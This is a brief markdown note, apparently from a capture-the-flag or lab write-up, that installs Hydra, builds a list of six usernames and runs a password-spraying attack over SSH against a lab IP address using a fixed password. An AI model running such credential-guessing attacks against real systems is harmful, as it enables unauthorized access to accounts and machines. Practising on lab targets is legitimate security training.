## Hydra
```sh
sudo apt-get install hydra
```

```sh
echo "root" > user.txt
echo "optimus" >> user.txt
echo "albert" >> user.txt
echo "andreas" >> user.txt
echo "christine" >> user.txt
echo "maria" >> user.txt

hydra -L user.txt -p 'funnel123#!#' 10.129.228.195 ssh
```